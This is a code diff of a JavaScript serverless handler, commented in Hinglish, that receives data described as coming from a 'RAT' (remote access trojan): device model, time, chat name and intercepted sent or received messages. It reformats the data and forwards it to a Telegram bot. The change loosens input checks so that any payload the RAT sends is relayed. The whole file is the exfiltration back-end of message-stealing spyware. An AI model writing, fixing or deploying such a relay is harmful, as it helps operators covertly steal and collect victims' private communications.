@@ -16,22 +16,33 @@ export default async function handler(request, response) {
         return response.status(401).json({ error: 'Unauthorized: Invalid Key' });
     }
 
-    const { model, time, type, chat, message } = data;
-
-    if (!model || !time || !type || !chat || !message) {
-        return response.status(400).json({ 
-            error: 'Incomplete data from RAT. Make sure model, time, type, chat, and message are all being sent.' 
-        });
+    if (Object.keys(data).length === 0) {
+        return response.status(400).json({ error: 'No data received' });
     }
 
     try {
+        // ### YAHAN MAGIC HO RAHA HAI ###
+        // Main data object ko ek string mein badal raha hoon
+        const dataString = Object.entries(data)
+            .map(([key, value]) => `${key}: ${value}`)
+            .join('\n');
+
+        // Ab us string se SENT ya RECEIVED dhoondh raha hoon
         let statusBlock;
-        if (type.toLowerCase().includes('sent')) {
+        if (dataString.toLowerCase().includes('sent')) {
             statusBlock = '📤 SENT';
         } else {
             statusBlock = '📥 RECEIVED';
         }
 
+        // Key-value pairs se important data nikal raha hoon
+        // Ye tere gande format ko bhi handle kar lega
+        const model = data.model || data.device || 'Unknown Device';
+        const time = data.time || 'N/A';
+        const chat = data.chat || 'N/A';
+        const message = data.message || '';
+
+        // Final message ko tere style mein jod raha hoon
         const formattedMessage = `
 📱 ${model}
 🕚 Time: ${time}
@@ -40,7 +51,7 @@ ${statusBlock}
 
 Chat: ${chat}
 Message: ${message}
-        `.trim();
+        `.trim().replace(/\*\*|__/g, ''); // Ye faltu ke ** ko hata dega
 
         const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
         
